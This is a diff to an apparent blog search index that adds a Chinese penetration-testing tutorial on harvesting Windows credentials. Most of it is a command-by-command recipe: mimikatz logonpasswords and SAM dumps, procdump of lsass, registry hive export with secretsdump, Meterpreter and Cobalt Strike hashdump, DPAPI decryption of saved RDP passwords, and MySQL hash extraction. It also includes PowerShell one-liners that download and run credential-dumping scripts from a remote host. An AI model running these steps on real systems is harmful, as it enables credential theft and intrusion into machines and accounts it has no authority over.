@@ -58,6 +58,193 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows密码凭证获取</title>
+    <url>/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
+    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Windows-Hash简介"><a href="#0x00-Windows-Hash简介" class="headerlink" title="0x00  Windows Hash简介"></a>0x00  Windows Hash简介</h3><h4 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h4><p>所谓哈希（hash），就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一 次数学加密函数运算，然后返回一个固定长度的字符串。 现在已经有了更新的NTLMv2以及Kerberos验证体系。</p>
+<p>Windows系统使用两种方法对用户的密码进行哈希处理，它们分别是LAN Manager（LM）哈希和NT LAN Manager（NTLM）哈希Windows加密过的密码口令，我们称之为hash，Windows的系统密码hash默认情况下一般由两部分组成：第一 部分是LM-hash，第二部分是NTLM-hash。</p>
+<p>Windows Hash格式：</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">用户名称<span class="symbol">:RID</span><span class="symbol">:LM-HASH</span>值<span class="symbol">:NT-HASH</span>值</span><br></pre></td></tr></table></figure>
+
+<p>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>2000</th>
+<th>xp</th>
+<th>2003</th>
+<th>Vista</th>
+<th>win7</th>
+<th>2008</th>
+<th>2012</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LM</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>NTLM</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+</tbody></table>
+<h4 id="Windows-认证基础"><a href="#Windows-认证基础" class="headerlink" title="Windows 认证基础"></a>Windows 认证基础</h4><p>Windows的认证包括三个部分： </p>
+<ul>
+<li><p>本地认证：用户直接操作计算机登陆账户 </p>
+</li>
+<li><p>网络认证：远程连接到工作组中的某个设备 </p>
+</li>
+<li><p>域认证：登陆到域环境中的某个设备</p>
+</li>
+</ul>
+<h4 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h4><ul>
+<li><p>用户输入密码 </p>
+</li>
+<li><p>系统收到密码后将用户输入的密码计算成NTLM Hash </p>
+</li>
+<li><p>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对 </p>
+</li>
+<li><p>匹配则登陆成功，不匹配则登陆失败</p>
+</li>
+</ul>
+<p>本地认证中用来处理用户输入密码的进程为lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p>
+<h3 id="0x01-系统用户密码凭证获取"><a href="#0x01-系统用户密码凭证获取" class="headerlink" title="0x01 系统用户密码凭证获取"></a>0x01 系统用户密码凭证获取</h3><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote>
+<p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+</blockquote>
+<h6 id="本地交互式"><a href="#本地交互式" class="headerlink" title="本地交互式"></a>本地交互式</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log res.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="本地非交互式凭证获取"><a href="#本地非交互式凭证获取" class="headerlink" title="本地非交互式凭证获取"></a>本地非交互式凭证获取</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log logon.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Powershell远程加载mimikatz脚本"><a href="#Powershell远程加载mimikatz脚本" class="headerlink" title="Powershell远程加载mimikatz脚本"></a>Powershell远程加载mimikatz脚本</h6><blockquote>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://ip:prot/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure>
+
+<h6 id="Powershell加载Get-PassHashes脚本"><a href="#Powershell加载Get-PassHashes脚本" class="headerlink" title="Powershell加载Get-PassHashes脚本"></a>Powershell加载Get-PassHashes脚本</h6><blockquote>
+<p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://<span class="number">47</span>.x.x.<span class="number">85</span>/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>
+
+<h4 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">官网地址：https:<span class="regexp">//</span>www.ampliasecurity.com/research.html</span><br><span class="line"><span class="number">32</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x32.zip</span><br><span class="line"><span class="number">64</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x64.zip</span><br><span class="line">历史版本下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>windows-credentials-editor/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.jpg"></p>
+<h4 id="Pwddump7"><a href="#Pwddump7" class="headerlink" title="Pwddump7"></a>Pwddump7</h4><p>这款工具可以读取出当前系统的各个用户的密码hash (包括LM和NTLM)。 在命令行输入Pwddump7.txt就可以读取出hash并显示出来，也可以保存到一个文件中。</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Pwddump7</span>.</span></span>exe &gt; pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/2.jpg"></p>
+<h4 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h4><blockquote>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
+</blockquote>
+<p>Procdump lsass 进程导出: </p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">For</span> <span class="number">32</span>bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line"><span class="keyword">For</span> <span class="number">64</span>bits：</span><br><span class="line">procdump.exe -accepteula -<span class="number">64</span> -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p>然后使用mimikatz还原密码：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> <span class="title">full</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h4><blockquote>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure>
+
+<h6 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">lsadump::<span class="title">sam</span> /<span class="title">system:system</span>.<span class="title">hiv</span> /<span class="title">sam:sam</span>.<span class="title">hiv</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+<h6 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>
+
+<h4 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h4><blockquote>
+<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
+</blockquote>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.jpg"></p>
+<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h6 id="Hashdump"><a href="#Hashdump" class="headerlink" title="Hashdump"></a>Hashdump</h6><p>获取system权限</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">meterpreter</span> &gt; getsystem</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
+
+<p>获取hash值</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump		//system权限的meterpreter</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit									//结果保存在tmp目录下</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h6 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; <span class="built_in">help</span> kiwi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#列举系统中的明文密码</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">#读取sam文件</span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line">#kiwi_cmd命令后面接mimikatz.exe的命令</span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-Hash解密"><a href="#0x02-Hash解密" class="headerlink" title="0x02  Hash解密"></a>0x02  Hash解密</h3><blockquote>
+<p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
+</blockquote>
+<h6 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h6><p>如果网站无法破解出hash值，可以使用ophcrack工具配合彩虹表破解。 </p>
+<p>工具下载：<a href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a> </p>
+<p>彩虹表： <a href="https://ophcrack.sourceforge.io/tables.php">https://ophcrack.sourceforge.io/tables.php</a> <a href="http://project-rainbowcrack.com/table.htm">http://project-rainbowcrack.com/table.htm</a></p>
+<h3 id="0x03-其他密码获取"><a href="#0x03-其他密码获取" class="headerlink" title="0x03  其他密码获取"></a>0x03  其他密码获取</h3><h4 id="获取RDP连接密码"><a href="#获取RDP连接密码" class="headerlink" title="获取RDP连接密码"></a>获取RDP连接密码</h4><h6 id="获取链接记录"><a href="#获取链接记录" class="headerlink" title="获取链接记录"></a>获取链接记录</h6><blockquote>
+<p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p>
+</blockquote>
+<h6 id="mimikatz解密"><a href="#mimikatz解密" class="headerlink" title="mimikatz解密"></a>mimikatz解密</h6><p>查看本地机器本地连接过的目标机器：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.jpg"></p>
+<p>查看本地用户此目录下是否存有RDP密码文件：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.jpg"></p>
+<p>查看保存在本地的远程主机信息：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
+
+<p>选择一个密码文件对其进行解密：</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D</span><br></pre></td></tr></table></figure>
+
+<p>此处需要记录下<code>guidMasterKey</code>的值，待会要通过<code>guidMasterKey</code>找对应的<code>Masterkey</code>。</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">guidMasterKey : &#123;<span class="number">56</span>dc62ge-<span class="number">0</span>af9-<span class="number">4925</span>-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据guidMasterKey找到对应的Masterkey：</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
+
+<p>通过Masterkey解密pbData数据，拿到明文RDP连接密码：</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\2</span>A203AFB09B575A760E88FA341B9E354</span><br><span class="line">/masterkey:2d72835b9c08a9332106c23017ee6c0a0be9a368de34c1f6acc6d34dc0de8bc264729bd7736</span><br><span class="line">f806e9456544841564be0d5e9564090a7bb143ac32579adabb02a</span><br></pre></td></tr></table></figure>
+
+<h4 id="Mysql数据库密码破解"><a href="#Mysql数据库密码破解" class="headerlink" title="Mysql数据库密码破解"></a>Mysql数据库密码破解</h4><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问 数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。 </p>
+<p>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权 限后即可直接从数据库连接文件中读取 一般都包含有数据库类型，物理位置，用户名和密码等信息</p>
+<h5 id="MYSQL数据库文件类型"><a href="#MYSQL数据库文件类型" class="headerlink" title="MYSQL数据库文件类型"></a>MYSQL数据库文件类型</h5><p>MYSQL数据库文件共有“frm”、“MYD”“和MYI”三种文件</p>
+<ul>
+<li>“.frm” 是描述表结构的文件 </li>
+<li>“.MYD” 是表的数据文件 </li>
+<li>“.MYI” 是表数据文件中任何索引的数据树</li>
+</ul>
+<p>与用户相关的一共有三个文件即user.frm、user.MYD、user.MYI，MYSQL数据库用户密码都保存在user.MYD 文件中，包括root用户和其他用户的密码</p>
+<h5 id="MYSQL加密方式"><a href="#MYSQL加密方式" class="headerlink" title="MYSQL加密方式"></a>MYSQL加密方式</h5><p>MYSQL数据库的认证密码有两种方式：</p>
+<ul>
+<li>MYSQL 4.1版本之前是MYSQL323加密 </li>
+<li>MYSQL 4.1和之后的版本都是MYSQLSHA1加密</li>
+</ul>
+<p>MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询， 前者是MYSQL323加密，后者是MYSQLSHA1方式加密。 MYSQL323加密中生成的是16位字符串，而在MYSQLSHA1中生存的是41位字符串，其中*是不加入实际的密 码运算中，MYSQLSHA1加密的密码的实际位数是40位</p>
+<h5 id="获取MYSQL密码"><a href="#获取MYSQL密码" class="headerlink" title="获取MYSQL密码"></a>获取MYSQL密码</h5><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.jpg"></p>
+<h5 id="Hash破解"><a href="#Hash破解" class="headerlink" title="Hash破解"></a>Hash破解</h5><ul>
+<li><a href="http://www.cmd5.com/">www.cmd5.com</a> </li>
+<li><a href="http://www.somd5.com/">www.somd5.com</a></li>
+</ul>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h6 id="SharpDecryptPwd"><a href="#SharpDecryptPwd" class="headerlink" title="SharpDecryptPwd"></a>SharpDecryptPwd</h6><p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.jpg"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用burp进行暴力破解</title>
     <url>/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
     <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Burp的工作模式"><a href="#0x00-Burp的工作模式" class="headerlink" title="0x00 Burp的工作模式"></a>0x00 <strong>Burp的工作模式</strong></h3><p>​    在没有burp之前，客户端使用浏览器直接与服务器进行通信。有了burp之后，burp在客户端与服务器之间充当代理。这样，浏览器发送给服务器的请求就会被burp进行捕获，而burp和wireshark这种审计类工具相比，其强大之处在于不仅可以做审计工作，更可以对数据包进行修改并发送出去。使用了burp的结构如下图所示。</p>
